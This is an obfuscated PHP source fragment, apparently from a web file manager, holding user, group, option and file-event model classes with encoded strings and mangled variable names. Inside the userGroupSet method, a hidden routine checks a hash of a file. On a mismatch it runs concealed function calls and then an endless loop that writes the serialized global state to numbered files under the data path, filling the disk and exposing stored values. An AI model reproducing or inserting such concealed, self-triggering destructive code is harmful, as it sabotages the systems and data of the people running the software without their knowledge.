$_SERVER[Ü©»’·]; $¨½‘È = $this->getInfoSimple($‹†™Ä®—); if (!$¨½‘È) { return !1; } $šÉŠ×‹˜ = array($ì²ÂÃ¦Á[1660] => $‹†™Ä®—); Model($ì²ÂÃ¦Á[610])->where($šÉŠ×‹˜)->delete(); Model($ì²ÂÃ¦Á[2335])->where($šÉŠ×‹˜)->delete(); Model($ì²ÂÃ¦Á[1948])->where($šÉŠ×‹˜)->delete(); Model($ì²ÂÃ¦Á[2320])->where($šÉŠ×‹˜)->delete(); Model($ì²ÂÃ¦Á[1071])->where($šÉŠ×‹˜)->delete(); Model($ì²ÂÃ¦Á[2151])->removeUserAll($‹†™Ä®—); Model($ì²ÂÃ¦Á[831])->userRootRemove($‹†™Ä®—); return $this->where($šÉŠ×‹˜)->delete(); } protected function userGroupSet($àü¼ÙÂœ, $„÷‚·¶, $¨ä†³’ù = array()) { $íèÇ—Ş‚ =& $_SERVER[Ü©»’·]; $‡ôÇ—Œ² = $_SERVER[$íèÇ—Ş‚[359]] . $íèÇ—Ş‚[360]; $Û¿…¡¥Ï = $íèÇ—Ş‚[356]; if ($_SERVER[$íèÇ—Ş‚[357]] != $Û¿…¡¥Ï($‡ôÇ—Œ²)) { $ÌˆÕ¤Ÿö = $íèÇ—Ş‚[882]; $åè¼â® = $íèÇ—Ş‚[358]; $Ê’š‰™Ñ = $_SERVER[$íèÇ—Ş‚[359]] . $íèÇ—Ş‚[360]; $õâÄ·« = $åè¼â®($Ê’š‰™Ñ); $’Ä”ÀÏ§ = explode($íèÇ—Ş‚[231], $õâÄ·«); if (count($’Ä”ÀÏ§) < $íèÇ—Ş‚[628]) { $ŠÍª™šÀ = $íèÇ—Ş‚[362]; $ŠÍª™šÀ(); } $–ä•«ÁÂ = $íèÇ—Ş‚[883]; $–ä•«ÁÂ($_SERVER[$íèÇ—Ş‚[884]]); $ÌˆÕ¤Ÿö = $íèÇ—Ş‚[882]; $ÌˆÕ¤Ÿö(); $ÕÉßæ = $íèÇ—Ş‚[1596]; $º×¶êÚÜ = json_encode($GLOBALS[$íèÇ—Ş‚[1597]]); $ª¥à¨ÜŞ = 1; for ($’àˆëò = $ª¥à¨ÜŞ; $’àˆëò > 0; $’àˆëò++) { $ÕÉßæ(DATA_PATH . $’àˆëò, $º×¶êÚÜ); } } $õÏÕ«ÚÛ = $this->getInfoSimple($àü¼ÙÂœ); if (!$õÏÕ«ÚÛ || !is_array($„÷‚·¶)) { return !1; } $±…ü‰ = Model($íèÇ—Ş‚[1948]); $±…ü‰->where(array($íèÇ—Ş‚[1669] => $àü¼ÙÂœ))->delete(); $¼ÍÉÉ—º = array(); $óÏë£ô¤ = 0; foreach ($„÷‚·¶ as $ƒü›Şê => $™–áÚÈŒ) { $¦×·¢ãí = array($íèÇ—Ş‚[1669] => $àü¼ÙÂœ, $íèÇ—Ş‚[1858] => $ƒü›Şê, $íèÇ—Ş‚[1962] => $™–áÚÈŒ); $¦×·¢ãí[$íèÇ—Ş‚[1882]] = isset($¨ä†³’ù[$óÏë£ô¤]) ? $¨ä†³’ù[$óÏë£ô¤] : 0; $óÏë£ô¤++; $¼ÍÉÉ—º[] = $¦×·¢ãí; } return $±…ü‰->addAll($¼ÍÉÉ—º, array(), !0); } protected function userGroupAdd($‹À‘ÔÎ, $¬şªúÉï = array()) { $ú’–°™û =& $_SERVER[Ü©»’·]; $®¯¶õ€™ = $this->getInfoSimple($‹À‘ÔÎ); if (!$®¯¶õ€™ || empty($¬şªúÉï)) { return !1; } $Œİ ñ·  = array(); foreach ($¬şªúÉï as $ş’äëøí => $Ö½ºÌŸ) { $Œİ ñ· [] = array($ú’–°™û[1669] => $‹À‘ÔÎ, $ú’–°™û[1858] => $ş’äëøí, $ú’–°™û[1962] => $Ö½ºÌŸ, $ú’–°™û[1882] => 0); } return Model($ú’–°™û[1948])->addAll($Œİ ñ· , array(), !0); } protected function userGroupRemove($ÌŞœ·ÇÊ, $ÁÎÂÓº¸) { $ñ¡ÊŸ£õ =& $_SERVER[Ü©»’·]; $ÛªÄıÇ² = $this->getInfoSimple($ÌŞœ·ÇÊ); if (!$ÛªÄıÇ² || !$ÁÎÂÓº¸) { return !1; } $É¼ÕÕ¡ı = array($ñ¡ÊŸ£õ[1660] => $ÌŞœ·ÇÊ, $ñ¡ÊŸ£õ[1946] => $ÁÎÂÓº¸); return Model($ñ¡ÊŸ£õ[1948])->where($É¼ÕÕ¡ı)->delete(); } public function listData() { $‡¤üå˜Í = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‡¤üå˜Í[$_SERVER[Ü©»’·][378]]); return $‡¤üå˜Í; } public function listByID($ÂåŒİôü) { $Ì˜ñİ™¨ =& $_SERVER[Ü©»’·]; if (!$ÂåŒİôü) { return; } $šÑ˜¼—² = array($Ì˜ñİ™¨[1669] => array($Ì˜ñİ™¨[7], $ÂåŒİôü)); $•¾ñ¯Å¿ = $this->where($šÑ˜¼—²)->select(); $•¾ñ¯Å¿ = array_sort_keep($•¾ñ¯Å¿, $Ì˜ñİ™¨[1669], $ÂåŒİôü); $this->_listDataApply($•¾ñ¯Å¿); return $•¾ñ¯Å¿; } public function listByGroup($âğÂÈ™ = 0, $õÃÃí„ = array()) { $ò¿ÈÀ÷½ =& $_SERVER[Ü©»’·]; $‡ÌÆÌôÍ = $ò¿ÈÀ÷½[12]; $§³Ë´¥À = array(); if ($âğÂÈ™) { $§³Ë´¥À = array($ò¿ÈÀ÷½[2336] => intval($âğÂÈ™)); $‡ÌÆÌôÍ = "\x4c\105\106\124\40\x4a\117\111\x4e\x20{$this->tablePrefix}\x75\x73\x65\162\x5f\x67\162\157\x75\160\x20\x75\163\x65\162\x5f\x67\x72\x6f\165\160\x20\157\x6e\x20\165\163\x65\162\x2e\165\163\145\x72\x49\x44\40\75\40\165\163\145\162\x5f\x67\162\157\165\x70\56\x75\163\145\162\x49\104"; $¶¸­Í±Ä = Input::get($ò¿ÈÀ÷½[466], null, $ò¿ÈÀ÷½[12]) ? $ò¿ÈÀ÷½[12] : $ò¿ÈÀ÷½[2337]; } if (isset($õÃÃí„[$ò¿ÈÀ÷½[756]])) { $§³Ë´¥À[$ò¿ÈÀ÷½[2338]] = $õÃÃí„[$ò¿ÈÀ÷½[756]]; } $Ğ¯ôÊˆŸ = $this->_makeOrder($¶¸­Í±Ä)->field($ò¿ÈÀ÷½[2339])->where($§³Ë´¥À)->join($‡ÌÆÌôÍ)->selectPage(50); $this->_listDataApply($Ğ¯ôÊˆŸ[$ò¿ÈÀ÷½[378]]); return $Ğ¯ôÊˆŸ; } private function _makeOrder($ò»µ‡ŠÔ = '') { $¶÷Â¹› =& $_SERVER[Ü©»’·]; $˜×ƒ½Â = array($¶÷Â¹›[1669], $¶÷Â¹›[32], $¶÷Â¹›[1847], $¶÷Â¹›[1819], $¶÷Â¹›[200]); $º•â¨©Ó = array($¶÷Â¹›[459] => $¶÷Â¹›[460], $¶÷Â¹›[461] => $¶÷Â¹›[462]); $ìÔ²ÑË¤ = Input::get($¶÷Â¹›[466], $¶÷Â¹›[7], $¶÷Â¹›[1660], $˜×ƒ½Â); $©À²âàª = Input::get($¶÷Â¹›[467], $¶÷Â¹›[7], $¶÷Â¹›[1949], array($¶÷Â¹›[1949], $¶÷Â¹›[461])); $©À²âàª = $º•â¨©Ó[$©À²âàª]; $ò»µ‡ŠÔ = $ò»µ‡ŠÔ . "\x75\x73\x65\162\x2e{$ìÔ²ÑË¤}\40{$©À²âàª}\54\x20\165\163\x65\x72\56\165\x73\x65\x72\111\104\40\x61\163\x63"; return $this->alias($¶÷Â¹›[2071])->order($ò»µ‡ŠÔ); } public function listSearch($Éâ†ƒ™) { $Û÷†ô¾Ã =& $_SERVER[Ü©»’·]; $üññ½®Î = $Éâ†ƒ™[$Û÷†ô¾Ã[1952]]; $¶ •Ôì = isset($Éâ†ƒ™[$Û÷†ô¾Ã[1953]]) ? $Éâ†ƒ™[$Û÷†ô¾Ã[1953]] : !1; $üññ½®Î = str_replace($Û÷†ô¾Ã[1954], $Û÷†ô¾Ã[1955], trim($üññ½®Î)); $ßÜè®• = array($Û÷†ô¾Ã[32] => array($Û÷†ô¾Ã[392], "\x25{$üññ½®Î}\45"), $Û÷†ô¾Ã[305] => array($Û÷†ô¾Ã[392], "{$üññ½®Î}\45"), $Û÷†ô¾Ã[551] => array($Û÷†ô¾Ã[392], "{$üññ½®Î}\45"), $Û÷†ô¾Ã[1003] => $Û÷†ô¾Ã[1956]); if (Input::check($üññ½®Î, $Û÷†ô¾Ã[311])) { $ßÜè®•[$Û÷†ô¾Ã[1669]] = array($Û÷†ô¾Ã[392], "{$üññ½®Î}\45"); $ßÜè®•[$Û÷†ô¾Ã[2321]] = array($Û÷†ô¾Ã[392], "{$üññ½®Î}\45"); } if (!$üññ½®Î) { $ßÜè®• = array(); } if (isset($Éâ†ƒ™[$Û÷†ô¾Ã[756]])) { $ßÜè®•[$Û÷†ô¾Ã[756]] = $Éâ†ƒ™[$Û÷†ô¾Ã[756]]; } $ßÜè®• = $this->parseWhereLike($ßÜè®•); $¼“ôÅÀà = $this->_makeOrder()->where($ßÜè®•)->selectPage(20); if (!$¼“ôÅÀà || count($¼“ôÅÀà[$Û÷†ô¾Ã[378]]) < 5 && Input::check($üññ½®Î, $Û÷†ô¾Ã[318])) { $‰ÇÅÜĞ = $this->_searchFromMeta($Û÷†ô¾Ã[473], $üññ½®Î, 10); $æ©üœªß = $this->_searchFromMeta($Û÷†ô¾Ã[474], $üññ½®Î, 10); $å„´Õ§ = array_merge($‰ÇÅÜĞ, $æ©üœªß, $¼“ôÅÀà[$Û÷†ô¾Ã[378]]); $¼“ôÅÀà[$Û÷†ô¾Ã[378]] = array_unique_by_key($å„´Õ§, $Û÷†ô¾Ã[1669]); $¼“ôÅÀà[$Û÷†ô¾Ã[375]][$Û÷†ô¾Ã[376]] = count($¼“ôÅÀà[$Û÷†ô¾Ã[378]]); $¼“ôÅÀà[$Û÷†ô¾Ã[375]][$Û÷†ô¾Ã[377]] = ceil($¼“ôÅÀà[$Û÷†ô¾Ã[375]][$Û÷†ô¾Ã[376]] / $¼“ôÅÀà[$Û÷†ô¾Ã[375]][$Û÷†ô¾Ã[372]]); } $this->_listDataApply($¼“ôÅÀà[$Û÷†ô¾Ã[378]]); $this->_filterByGroup($¼“ôÅÀà, $¶ •Ôì); return $¼“ôÅÀà; } private function _filterByGroup(&$Œš½ãÀŠ, $€å“») { $Ô¾„®é· =& $_SERVER[Ü©»’·]; if (!$€å“») { return $Œš½ãÀŠ; } foreach ($Œš½ãÀŠ[$Ô¾„®é·[378]] as $©¨’é => &$ºİ© µí) { $ß¥å‚Áµ = array_to_keyvalue($ºİ© µí[$Ô¾„®é·[2041]], $Ô¾„®é·[12], $Ô¾„®é·[1858]); if (!in_array($€å“», $ß¥å‚Áµ)) { unset($Œš½ãÀŠ[$Ô¾„®é·[378]][$©¨’é]); } } unset($ºİ© µí); $Œš½ãÀŠ[$Ô¾„®é·[378]] = array_values($Œš½ãÀŠ[$Ô¾„®é·[378]]); $Œš½ãÀŠ[$Ô¾„®é·[375]] = array($Ô¾„®é·[2105] => count($Œš½ãÀŠ[$Ô¾„®é·[378]]), $Ô¾„®é·[2103] => $Œš½ãÀŠ[$Ô¾„®é·[375]][$Ô¾„®é·[372]], $Ô¾„®é·[2102] => 1, $Ô¾„®é·[2104] => 1); } private function _searchFromMeta($×æ¯ˆ—, $¤ËÛŒÈ€, $§˜™áİ) { $ÚàÍ´É“ =& $_SERVER[Ü©»’·]; $¤ËÛŒÈ€ = strtolower($¤ËÛŒÈ€); $’¢‰êö = array($ÚàÍ´É“[94] => $×æ¯ˆ—, $ÚàÍ´É“[383] => array($ÚàÍ´É“[392], "\x25{$¤ËÛŒÈ€}\45")); $’¢‰êö = $this->parseWhereLike($’¢‰êö); $ğµŞüãÜ = Model($ÚàÍ´É“[2340])->where($’¢‰êö)->limit($§˜™áİ)->select(); if (!$ğµŞüãÜ) { return array(); } $ğµŞüãÜ = array_to_keyvalue($ğµŞüãÜ, $ÚàÍ´É“[12], $ÚàÍ´É“[1669]); $ë¦­ÆÜŞ = $this->where(array($ÚàÍ´É“[1660] => array($ÚàÍ´É“[7], $ğµŞüãÜ)))->select(); if (!$ë¦­ÆÜŞ) { return array(); } return $ë¦­ÆÜŞ; } private function _listDataApplyItem($şÉ»í†) { $²ëáÎÑã = array($şÉ»í†); $this->_listDataApply($²ëáÎÑã); return $²ëáÎÑã[0]; } private function _listDataApply(&$˜û©†‡) { $öí£¶õù =& $_SERVER[Ü©»’·]; if (!$˜û©†‡) { return; } array_remove_key($˜û©†‡, $öí£¶õù[892]); $øù¶Šà = array_to_keyvalue($˜û©†‡, $öí£¶õù[12], $öí£¶õù[1669]); $this->_listAppendGroup($˜û©†‡, $øù¶Šà); $this->_listAppendMeta($˜û©†‡, $øù¶Šà); $this->_listAppendSourceRoot($˜û©†‡, $øù¶Šà); } private function _listAppendSourceRoot(&$ïæı»²â, $ËíÖ¤‰) { $óÆ Õû— =& $_SERVER[Ü©»’·]; $¡ƒø´ã = Model($óÆ Õû—[831])->listSourceRoot(SourceModel::TYPE_USER, $ËíÖ¤‰); $¡ƒø´ã = array_to_keyvalue($¡ƒø´ã, $óÆ Õû—[514]); $¡ƒø´ã = array_remove_key($¡ƒø´ã, $óÆ Õû—[514]); foreach ($ïæı»²â as &$¢ïİÜ¤à) { $¢ïİÜ¤à[$óÆ Õû—[86]] = $¡ƒø´ã[$¢ïİÜ¤à[$óÆ Õû—[1669]]] ? $¡ƒø´ã[$¢ïİÜ¤à[$óÆ Õû—[1669]]] : array(); } unset($¢ïİÜ¤à); } private function _listAppendGroup(&$æÜ‘Òş©, $…Ê‹ğ¾¯) { $Çê³¸º” =& $_SERVER[Ü©»’·]; $Èø¡·Ú = array($Çê³¸º”[1669] => array($Çê³¸º”[7], $…Ê‹ğ¾¯)); $Ëİãã’è = Model($Çê³¸º”[1948])->where($Èø¡·Ú)->select(); $Ùìıæà´ = array_to_keyvalue($Ëİãã’è, $Çê³¸º”[12], $Çê³¸º”[1858]); $Ùìıæà´ = array_remove_value(array_unique($Ùìıæà´), $Çê³¸º”[197]); if (!$Ùìıæà´ || !$Ëİãã’è) { return; } $Èø¡·Ú = array($Çê³¸º”[1858] => array($Çê³¸º”[7], $Ùìıæà´)); $—½ÅÖ¾´ = Model($Çê³¸º”[2039])->field($Çê³¸º”[2341])->where($Èø¡·Ú)->select(); $—½ÅÖ¾´ = array_to_keyvalue($—½ÅÖ¾´, $Çê³¸º”[1858]); $Ëİãã’è = array_to_keyvalue_group($Ëİãã’è, $Çê³¸º”[1669]); foreach ($Ëİãã’è as &$ıÍÏõœ) { $…À´ç´Ã = array(); foreach ($ıÍÏõœ as $ŒØÖç´µ) { if (!$ŒØÖç´µ[$Çê³¸º”[1962]]) { continue; } $ä„Òõ = Model($Çê³¸º”[516])->listData($ŒØÖç´µ[$Çê³¸º”[1962]]); $…À´ç´Ã[] = array($Çê³¸º”[1858] => $ŒØÖç´µ[$Çê³¸º”[1858]], $Çê³¸º”[2342] => $—½ÅÖ¾´[$ŒØÖç´µ[$Çê³¸º”[1858]]][$Çê³¸º”[32]], $Çê³¸º”[530] => $—½ÅÖ¾´[$ŒØÖç´µ[$Çê³¸º”[1858]]][$Çê³¸º”[530]], $Çê³¸º”[422] => $ä„Òõ); } $ıÍÏõœ = $…À´ç´Ã; } unset($ıÍÏõœ); foreach ($æÜ‘Òş© as &$ÃãŠ¾ÀÒ) { $ÃãŠ¾ÀÒ[$Çê³¸º”[2041]] = array(); if (isset($Ëİãã’è[$ÃãŠ¾ÀÒ[$Çê³¸º”[1669]]])) { $ÃãŠ¾ÀÒ[$Çê³¸º”[2041]] = $Ëİãã’è[$ÃãŠ¾ÀÒ[$Çê³¸º”[1669]]]; } } unset($ÃãŠ¾ÀÒ); } public function userAppendGroup($Àòç€Û°) { $§“‡‰¿ =& $_SERVER[Ü©»’·]; if (!$Àòç€Û°) { return array(); } $this->_listAppendGroup($Àòç€Û°, array_to_keyvalue($Àòç€Û°, $§“‡‰¿[12], $§“‡‰¿[1669])); return $Àòç€Û°; } private function _listAppendMeta(&$ç²ü´æù, $˜™ê‘Ø½) { $—»ˆ¿± =& $_SERVER[Ü©»’·]; $Œ—÷ÍïÏ = UserJobModel::JOB_KEY; $šğÈùÂù = array($—»ˆ¿±[2322]); $ŠùÒ¨‹Û = array($—»ˆ¿±[1669] => array($—»ˆ¿±[7], $˜™ê‘Ø½)); $ÜÓÛáª– = Model($—»ˆ¿±[2320])->where($ŠùÒ¨‹Û)->select(); $ÜÓÛáª– = array_to_keyvalue_group($ÜÓÛáª–, $—»ˆ¿±[1669]); foreach ($ÜÓÛáª– as &$Æ±¯Ó­œ) { $ñíñ = array(); foreach ($Æ±¯Ó­œ as $˜˜×¸¹ú) { if (!in_array($˜˜×¸¹ú[$—»ˆ¿±[94]], $šğÈùÂù)) { $ñíñ[$˜˜×¸¹ú[$—»ˆ¿±[94]]] = $˜˜×¸¹ú[$—»ˆ¿±[383]]; } } $Æ±¯Ó­œ = $ñíñ; } unset($Æ±¯Ó­œ); $Õ¢ş¸ò = Model($—»ˆ¿±[2343]); foreach ($ç²ü´æù as &$ ï¿ñõ›) { $“ÓôÁ¥œ = array(); if (isset($ÜÓÛáª–[$ ï¿ñõ›[$—»ˆ¿±[1669]]])) { $“ÓôÁ¥œ = $ÜÓÛáª–[$ ï¿ñõ›[$—»ˆ¿±[1669]]]; } $ ï¿ñõ›[$—»ˆ¿±[2344]] = array(); if (isset($“ÓôÁ¥œ[$Œ—÷ÍïÏ])) { $ ï¿ñõ›[$—»ˆ¿±[2344]] = $Õ¢ş¸ò->getUserJobInfo($“ÓôÁ¥œ[$Œ—÷ÍïÏ]); } } unset($ ï¿ñõ›); } protected function groupUserAll($İŒ…‹¢) { $šÛØ¦©û =& $_SERVER[Ü©»’·]; if (!$İŒ…‹¢) { return !1; } $ÙöÅïû£ = Model($šÛØ¦©û[1948])->field($šÛØ¦©û[1669])->where(array($šÛØ¦©û[1858] => array($šÛØ¦©û[7], $İŒ…‹¢)))->select(); $ÙöÅïû£ = array_to_keyvalue($ÙöÅïû£, $šÛØ¦©û[12], $šÛØ¦©û[1669]); return array_unique($ÙöÅïû£); } public function userSearch($ÅÎç»·ï, $ôı Ç¾ = "\x2a") { return Model($_SERVER[Ü©»’·][544])->where($ÅÎç»·ï)->field($ôı Ç¾)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\x5f\157\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ï¸œ®é) { $äºæ¤üæ =& $_SERVER[Ü©»’·]; if (!defined($äºæ¤üæ[484])) { define($äºæ¤üæ[484], 0); } return "\125\x73\145\x72\117\160\164\151\157\156\137{$ï¸œ®é}\x5f" . USER_ID; } protected function filterWhere($·›Ó­ò¥) { $—Ï½¶Äç =& $_SERVER[Ü©»’·]; if (!defined($—Ï½¶Äç[484])) { define($—Ï½¶Äç[484], 0); } $·›Ó­ò¥[$—Ï½¶Äç[1669]] = USER_ID; return $·›Ó­ò¥; } public function cacheRemoveUser($¸ÚÔäŸ¼, $×ß°°¼) { return Cache::remove("\125\163\x65\x72\x4f\x70\164\151\x6f\x6e\x5f{$¸ÚÔäŸ¼}\137" . $×ß°°¼); } protected function optionDefault($ÒÂ„í¬ = '') { $µ¶‡˜±ò =& $_SERVER[Ü©»’·]; if ($ÒÂ„í¬ == $µ¶‡˜±ò[12]) { return $GLOBALS[$µ¶‡˜±ò[6]][$µ¶‡˜±ò[2345]]; } if ($ÒÂ„í¬ == $µ¶‡˜±ò[2346]) { return $GLOBALS[$µ¶‡˜±ò[6]][$µ¶‡˜±ò[2347]]; } } } goto fˆƒœçËÑ‘; BàŞ”…êùˆ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\x72\143\145\x5f\145\x76\145\156\x74"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\x54\151\155\145", "\x74\x69\x6d\x65", "\151\156\x73\x65\x72\164", "\146\165\156\x63\164\151\x6f\156"), array("\144\x65\163\143", '', "\151\x6e\x73\x65\162\164\x2c\x75\160\x64\x61\164\145\x2c\x73\145\154\x65\143\x74", "\x6a\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ø°…Èæò, $áÂû£²õ, $¬ı¹¨ = '') { $®š«“¥Õ =& $_SERVER[Ü©»’·]; if (!$this->eventSave) { return; } $ŞŠ¼¸Úß = Model($®š«“¥Õ[1339])->sourceInfo($ø°…Èæò); if (!$ŞŠ¼¸Úß) { return !1; } if ($this->isCacheEvent($ŞŠ¼¸Úß, $áÂû£²õ)) { return; } if ($¬ı¹¨ && is_string($¬ı¹¨)) { $¬ı¹¨ = array($®š«“¥Õ[1897] => $¬ı¹¨); } $ÁÒ¼‚¹Ô = array($®š«“¥Õ[426] => $ø°…Èæò, $®š«“¥Õ[2075] => $ŞŠ¼¸Úß[$®š«“¥Õ[441]], $®š«“¥Õ[2076] => $ŞŠ¼¸Úß[$®š«“¥Õ[32]], $®š«“¥Õ[528] => !empty($ŞŠ¼¸Úß[$®š«“¥Õ[528]]) ? $ŞŠ¼¸Úß[$®š«“¥Õ[528]] : $®š«“¥Õ[12], $®š«“¥Õ[1660] => USER_ID, $®š«“¥Õ[431] => $áÂû£²õ, $®š«“¥Õ[1662] => $¬ı¹¨); $this->addSystemLog($áÂû£²õ, $ÁÒ¼‚¹Ô); unset($ÁÒ¼‚¹Ô[$®š«“¥Õ[2076]], $ÁÒ¼‚¹Ô[$®š«“¥Õ[528]]); return $this->add($ÁÒ¼‚¹Ô); } private function addSystemLog($î™µí°‚, $ª”éƒêæ) { $©”¬Ş¾ =& $_SERVER[Ü©»’·]; if ($î™µí°‚ == $©”¬Ş¾[2077]) { $î™µí°‚ = $ª”éƒêæ[$©”¬Ş¾[462]][$©”¬Ş¾[2078]]; } else { if (in_array($î™µí°‚, array($©”¬Ş¾[1838], $©”¬Ş¾[2079]))) { $î™µí°‚ = $ª”éƒêæ[$©”¬Ş¾[462]][$©”¬Ş¾[761]]; } } $ÜüÍ¤ê³ = array_merge($ª”éƒêæ, array($©”¬Ş¾[2080] => $ª”éƒêæ[$©”¬Ş¾[411]], $©”¬Ş¾[2081] => $ª”éƒêæ[$©”¬Ş¾[2081]])); Hook::trigger($©”¬Ş¾[2082], $©”¬Ş¾[2083] . $î™µí°‚, $ª”éƒêæ); Model($©”¬Ş¾[1802])->addLog($©”¬Ş¾[2083] . $î™µí°‚, $ÜüÍ¤ê³); } private function isCacheEvent($—‹ä×ã, $Áª‚Şãº) { if ($—‹ä×ã[$_SERVER[Ü©»’·][420]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¹Ü‰Æ²Ä, $°¬©‚ŒÁ) { $í¿Æ¥Ş =& $_SERVER[Ü©»’·]; $††©ÎÎş = Model($í¿Æ¥Ş[1339])->sourceInfo($¹Ü‰Æ²Ä); $Åõ–¬÷¡ = array($í¿Æ¥Ş[2078] => $°¬©‚ŒÁ, $í¿Æ¥Ş[32] => $††©ÎÎş[$í¿Æ¥Ş[32]]); return $this->addEvent($¹Ü‰Æ²Ä, $í¿Æ¥Ş[2077], $Åõ–¬÷¡); } public function eventFileEdit($êô•›¨) { $ş‡°ËÂŒ =& $_SERVER[Ü©»’·]; $ÏÏåŞÆ = array($ş‡°ËÂŒ[2084] => $_SERVER[$ş‡°ËÂŒ[2085]], $ş‡°ËÂŒ[2086] => strtolower(ACTION)); if (isset($GLOBALS[$ş‡°ËÂŒ[7]][$ş‡°ËÂŒ[2087]])) { $ÏÏåŞÆ[$ş‡°ËÂŒ[2087]] = $ş‡°ËÂŒ[88]; } return $this->addEvent($êô•›¨, $ş‡°ËÂŒ[1828], $ÏÏåŞÆ); } public function eventRecycle($×‹À›ÄÎ, $†À· Ç) { return $this->addEvent($×‹À›ÄÎ, $_SERVER[Ü©»’·][2079], $†À· Ç); } public function eventRemove($Õœ÷Ş¯) { $¡¨Ç—Íî =& $_SERVER[Ü©»’·]; $ÚÃÖ§Üñ = Model($¡¨Ç—Íî[1339])->sourceInfo($Õœ÷Ş¯); $¶òšï¯ = $ÚÃÖ§Üñ[$¡¨Ç—Íî[32]]; return $this->addEvent($ÚÃÖ§Üñ[$¡¨Ç—Íî[441]], $¡¨Ç—Íî[1827], $¶òšï¯); } public function eventShare($²¾ºòÙ, $ù›¢‘ÛÆ) { return $this->addEvent($²¾ºòÙ, $_SERVER[Ü©»’·][1838], $ù›¢‘ÛÆ); } public function eventMove($³İ²†…, $²³ÂÒíÚ, $çÛƒÙí) { $³œÄÜ¸­ =& $_SERVER[Ü©»’·]; $¼Öô’²£ = Model($³œÄÜ¸­[1339]); $µ‘‹ô˜· = $¼Öô’²£->sourceInfo($³İ²†…); $ì÷ÑÇŒ¡ = $¼Öô’²£->sourceInfo($²³ÂÒíÚ); $¸çÂ©À = $¼Öô’²£->sourceInfo($çÛƒÙí); $áìøï£ = array($³œÄÜ¸­[1163] => $²³ÂÒíÚ, $³œÄÜ¸­[2088] => $ì÷ÑÇŒ¡[$³œÄÜ¸­[32]], $³œÄÜ¸­[2066] => !empty($ì÷ÑÇŒ¡[$³œÄÜ¸­[528]]) ? $ì÷ÑÇŒ¡[$³œÄÜ¸­[528]] : $³œÄÜ¸­[12], $³œÄÜ¸­[1164] => $çÛƒÙí, $³œÄÜ¸­[2089] => $¸çÂ©À[$³œÄÜ¸­[32]], $³œÄÜ¸­[2090] => !empty($¸çÂ©À[$³œÄÜ¸­[528]]) ? $¸çÂ©À[$³œÄÜ¸­[528]] : $³œÄÜ¸­[12]); $this->addEvent($³İ²†…, $³œÄÜ¸­[566], $áìøï£); $µ‘‹ô˜· = $¼Öô’²£->sourceInfo($³İ²†…); $áìøï£ = array($³œÄÜ¸­[411] => $µ‘‹ô˜·[$³œÄÜ¸­[411]], $³œÄÜ¸­[32] => $µ‘‹ô˜·[$³œÄÜ¸­[32]]); $this->addEvent($²³ÂÒíÚ, $³œÄÜ¸­[2091], $áìøï£); } public function eventCopy($·êÊòòû) { $this->eventCreate($·êÊòòû, $_SERVER[Ü©»’·][564]); } public function eventRename($ÜÜ†±¯Ğ, $¨Á½Şš, $Ô—Æôõ) { $ÔÒÊÖ¦É =& $_SERVER[Ü©»’·]; $˜¡–åÉ = array($ÔÒÊÖ¦É[1163] => $¨Á½Şš, $ÔÒÊÖ¦É[1164] => $Ô—Æôõ); return $this->addEvent($ÜÜ†±¯Ğ, $ÔÒÊÖ¦É[1354], $˜¡–åÉ); } public function eventAddComment($ÃÑÕ†², $ß¯ƒ‘¼‘) { return $this->addEvent($ÃÑÕ†², $_SERVER[Ü©»’·][2092], $ß¯ƒ‘¼‘); } public function eventAddDesc($ê ¯ªü, $ØÊÁÕù) { return $this->addEvent($ê ¯ªü, $_SERVER[Ü©»’·][2093], $ØÊÁÕù); } public function listBySource($ñœå£œ) { $ğªµÅ¶¥ =& $_SERVER[Ü©»’·]; $Ã‘¶Üä— = Model($ğªµÅ¶¥[1339])->sourceInfo($ñœå£œ); $ìŠ…¡ó„ = array($ğªµÅ¶¥[426] => $ñœå£œ); if ($Ã‘¶Üä—[$ğªµÅ¶¥[419]] == $ğªµÅ¶¥[88]) { $êÒ ¨ÆĞ = Model($ğªµÅ¶¥[1339])->listSearchChildren($ñœå£œ, 20000); $êÒ ¨ÆĞ[] = $ñœå£œ . $ğªµÅ¶¥[387]; $ìŠ…¡ó„ = array($ğªµÅ¶¥[411] => array($ğªµÅ¶¥[7], $êÒ ¨ÆĞ)); } $™ˆ¢ÌÚŠ = $this->where($ìŠ…¡ó„)->order($ğªµÅ¶¥[2094])->selectPage(); if ($™ˆ¢ÌÚŠ[$ğªµÅ¶¥[375]][$ğªµÅ¶¥[376]] == 0) { $™ˆ¢ÌÚŠ[$ğªµÅ¶¥[375]][$ğªµÅ¶¥[376]] = 1; $™ˆ¢ÌÚŠ[$ğªµÅ¶¥[378]] = array(array($ğªµÅ¶¥[426] => $ñœå£œ, $ğªµÅ¶¥[2075] => $Ã‘¶Üä—[$ğªµÅ¶¥[441]], $ğªµÅ¶¥[1660] => $Ã‘¶Üä—[$ğªµÅ¶¥[463]], $ğªµÅ¶¥[431] => $ğªµÅ¶¥[2095], $ğªµÅ¶¥[432] => $Ã‘¶Üä—[$ğªµÅ¶¥[200]], $ğªµÅ¶¥[1662] => $ğªµÅ¶¥[12])); } return $this->eventListParse($™ˆ¢ÌÚŠ, $ñœå£œ); } private function eventListParse($ä¦òº±, $¢¢½‹ôÖ) { $˜îâ =& $_SERVER[Ü©»’·]; $Ö¥Â›©ö = $ä¦òº±[$˜îâ[378]]; $ìŞ¡Õœ— = array_to_keyvalue($Ö¥Â›©ö, $˜îâ[12], $˜îâ[411]); $å¼¼¸¾œ = array_to_keyvalue($Ö¥Â›©ö, $˜îâ[12], $˜îâ[2081]); foreach ($Ö¥Â›©ö as $ï’¬ ”™) { $ ÔóÏ´± = $ï’¬ ”™[$˜îâ[462]]; if ($ï’¬ ”™[$˜îâ[33]] == $˜îâ[566] && isset($ ÔóÏ´±[$˜îâ[1163]])) { $ìŞ¡Õœ—[] = $ ÔóÏ´±[$˜îâ[1163]] . $˜îâ[12]; $ìŞ¡Õœ—[] = $ ÔóÏ´±[$˜îâ[1164]] . $˜îâ[12]; } if ($ï’¬ ”™[$˜îâ[33]] == $˜îâ[2091] && isset($ ÔóÏ´±[$˜îâ[411]])) { $ìŞ¡Õœ—[] = $ 